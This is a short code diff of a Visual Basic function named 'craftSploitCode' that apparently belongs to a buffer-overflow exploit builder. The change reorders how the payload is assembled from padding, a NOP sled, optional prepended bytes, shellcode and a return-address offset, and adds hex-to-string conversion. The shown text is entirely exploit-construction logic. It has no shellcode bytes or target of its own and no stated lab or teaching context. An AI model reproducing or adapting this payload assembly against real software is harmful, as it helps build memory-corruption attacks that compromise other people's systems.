@@ -52,19 +52,22 @@ Public Function craftSploitCode() As Integer 'returns error code
     Dim myPacket As String
     Dim junk As String
     
+    retOffset = HexToStr(retOffset)
+    
     If useNops = True Then
-        junk = makePadding(bufferLen - Len(shellcode) - nopCount) 'giving 25 for nop space
-        myPacket = junk & makeNops(nopCount) & shellcode
+        junk = makePadding(bufferLen - Len(shellcode) - nopCount)
+        myPacket = junk & makeNops(nopCount)
     Else
         junk = makePadding(bufferLen - Len(shellcode))
-        myPacket = junk & shellcode
+        myPacket = junk
     End If
     
     
     If prepend = True Then
-        myPacket = myPacket & prependBytes
+        myPacket = myPacket & HexToStr(prependBytes)
     End If
     
+    myPacket = myPacket & shellcode
     
     myPacket = myPacket & retOffset
      
